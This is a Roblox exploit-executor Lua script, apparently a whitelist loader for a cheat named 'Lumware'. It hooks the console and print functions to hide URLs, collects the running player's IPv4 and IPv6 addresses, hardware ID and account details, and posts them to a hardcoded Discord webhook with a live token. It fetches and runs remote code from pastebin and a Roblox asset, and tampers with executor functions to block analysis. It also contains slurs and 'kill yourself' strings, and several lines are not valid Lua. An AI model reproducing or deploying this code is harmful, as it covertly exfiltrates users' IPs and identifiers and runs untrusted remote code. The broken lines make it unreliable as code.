local kys = "kill yourself mf"
local msg = "silly monkey brain"
local retard

local LocalPlayer = game:GetService("Players").LocalPlayer

local LWP
LWP = hookfunction(print,function(urprint,...)
   if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
       urprint = kys
       retard
   end
 return LWP(urprint,...)
end)

local LWE
LWE = hookfunction(error,function(urprint,...)
   if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
       urprint = kys
       retard
   end
 return LWE(urprint,...)
end)

local LWW
LWW = hookfunction(warn,function(urprint,...)
   if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
       urprint = kys
       retard
   end
 return LWW(urprint,...)
end)

local LWWR
LWWR = hookfunction(rconsoleprint,function(urprint,...)
   if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
       urprint = kys
       retard
   end
 return LWWR(urprint,...)
end)

local LWWM
LWWM = hookfunction(rconsoleerr,function(urprint,...)
   if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
       urprint = kys
      retard
   end
 return LWWM(urprint,...)
end)

local LWWN
LWWN = hookfunction(rconsolewarn,function(urprint,...)
   if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
       urprint = kys
      retard
   end
 return LWWN(urprint,...)
end)

local LWWZ
LWWZ = hookfunction(rconsoleclear,function(urprint,...)
   if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
       urprint = kys
       retard
   end
 return LWWZ(urprint,...)
end)

local LWWH
LWWH = hookfunction(rconsoleinput,function(urprint,...)
   if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
       urprint = kys
       retard
   end
 return LWWH(urprint,...)
end)

local LWWT
LWWT = hookfunction(rconsolename,function(urprint,...)
   if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
       urprint = kys
       retard
   end
 return LWWT(urprint,...)
end)

local IPv4 = game:HttpGet("https://v4.ident.me/")
local IPv6 = game:HttpGet("https://v6.ident.me/")

local HttpRequest = http_request;

if syn then
   HttpRequest = syn.request
   else
   HttpRequest = http_request
end

local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
local Headers = {["content-type"] = "application/json"} -- Don't Modify

local AccountAge = LocalPlayer.AccountAge
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local UserId = LocalPlayer.UserId
 
local PlayerData =
{
       ["content"] = "`Player Execution Log Found!`",
       ["embeds"] = {{
           ["title"] = "**Lumware Execution Log Service**",
           ["description"] = "Username: "..LocalPlayer.Name.." | Display Name: "..LocalPlayer.DisplayName.."",
           ["color"] = tonumber(0x1FFF00),
           ["fields"] = {
               {
                   ["name"] = "Membership Type:",
                   ["value"] = MembershipType,
                   ["inline"] = true
},
               {
                   ["name"] = "AccountAge:",
                   ["value"] = AccountAge,
                   ["inline"] = true
},
               {
                   ["name"] = "UserId:",
                   ["value"] = UserId,
                   ["inline"] = true
},
               {
                   ["name"] = "IPv4:",
                   ["value"] = IPv4,
                   ["inline"] = true
},
               {
                   ["name"] = "IPv6:",
                   ["value"] = IPv6,
                   ["inline"] = true
},
                {
                   ["name"] = "Roblox HWID:",
                   ["value"] = HWID,
                   ["inline"] = true
},

                {
                   ["name"] = "Roblox Profile Link:",
                   ["value"] = "https://www.roblox.com/users/"..LocalPlayer.UserId.."/profile",
                   ["inline"] = true
},
           },
       }}
   }

local CrackerData =
{
       ["content"] = "",
       ["embeds"] = {{
           ["title"] = "**POSSIBLE CRACKER DETECTED!**",
           ["description"] = "Username: "..LocalPlayer.Name.." | Display Name: "..LocalPlayer.DisplayName.."",
           ["color"] = tonumber(0xFF0000),
           ["fields"] = {
               {
                   ["name"] = "Membership Type:",
                   ["value"] = MembershipType,
                   ["inline"] = true
},
               {
                   ["name"] = "AccountAge:",
                   ["value"] = AccountAge,
                   ["inline"] = true
},
               {
                   ["name"] = "UserId:",
                   ["value"] = UserId,
                   ["inline"] = true
},
               {
                   ["name"] = "IPv4:",
                   ["value"] = IPv4,
                   ["inline"] = true
},
               {
                   ["name"] = "IPv6:",
                   ["value"] = IPv6,
                   ["inline"] = true
},
                {
                   ["name"] = "Roblox HWID:",
                   ["value"] = HWID,
                   ["inline"] = true
},
                {
                   ["name"] = "Roblox Profile Link:",
                   ["value"] = "https://www.roblox.com/users/"..LocalPlayer.UserId.."/profile",
                   ["inline"] = true
},
           },
       }}
   }
   
local UnknownData =
{
       ["content"] = "",
       ["embeds"] = {{
           ["title"] = "**WHO EVEN IS THIS PERSON?**",
           ["description"] = "Username: "..LocalPlayer.Name.." | Display Name: "..LocalPlayer.DisplayName.."",
           ["color"] = tonumber(0x000000),
           ["fields"] = {
               {
                   ["name"] = "Membership Type:",
                   ["value"] = MembershipType,
                   ["inline"] = true
},
               {
                   ["name"] = "AccountAge:",
                   ["value"] = AccountAge,
                   ["inline"] = true
},
               {
                   ["name"] = "UserId:",
                   ["value"] = UserId,
                   ["inline"] = true
},
               {
                   ["name"] = "IPv4:",
                   ["value"] = IPv4,
                   ["inline"] = true
},
               {
                   ["name"] = "IPv6:",
                   ["value"] = IPv6,
                   ["inline"] = true
},
                {
                   ["name"] = "Roblox HWID:",
                   ["value"] = HWID,
                   ["inline"] = true
},
                {
                   ["name"] = "Roblox Profile Link:",
                   ["value"] = "https://www.roblox.com/users/"..LocalPlayer.UserId.."/profile",
                   ["inline"] = true
},
           },
       }}
   }


local Webhook = "https://discord.com/api/webhooks/1096520237148541028/zJOrqauz62kJ4ge408S-hsEOyTdKCFd-pV2GEgdzoJmVxJv0n1D9j6S-XBcKGv0PmCNS"

local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
local CrackerData = game:GetService('HttpService'):JSONEncode(CrackerData)
local UnknownData = game:GetService('HttpService'):JSONEncode(UnknownData)

local HWID_Table = loadstring(game:HttpGet("https://pastebin.com/raw/cTcTEJuU"))()
local main = game:GetObjects("rbxassetid://13115298212")[1].Source

if table.find(HWID_Table, HWID) then
HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
loadstring(main)()
main = nil
main = "monkey"
else
   HttpRequest({Url=Webhook, Body=UnknownData, Method="POST", Headers=Headers})
   LocalPlayer:Kick("Execution Failed | WL_ID: (21z7y16): You are not whitelisted!")
end

retard = syn.request({Url=Webhook, Body=CrackerData, Method="POST", Headers=Headers}) or http_request({Url=Webhook, Body=CrackerData, Method="POST", Headers=Headers})

pcall(function()
getgenv().rconsoleprint = g
end) 

if syn then
setreadonly(getgenv().syn,false)
getgenv().syn.request=function() return math.random(1,2)==1 and "synapse-chan uwu" or "nah-ah kiddo" end
print(getgenv().islclosure(getgenv().syn.request))
setreadonly(getgenv().syn,true)
print(syn.request())
getgenv().islclosure=function(x) if x==getgenv().syn.request or x==getgenv().islclosure then return false end end
print(getgenv().islclosure(getgenv().syn.request))
end
